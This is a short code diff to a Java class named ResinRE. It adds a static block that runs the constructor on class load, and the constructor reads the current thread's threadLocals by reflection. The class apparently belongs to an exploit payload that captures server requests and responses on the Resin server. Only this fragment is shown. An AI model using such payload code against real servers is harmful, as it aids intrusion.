@@ -28,6 +28,9 @@ public class ResinRE {
     private static String HEADER;
     private static String RHEADER;
 
+    static {
+        new ResinRE();
+    }
     public ResinRE() {
         try {
             Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
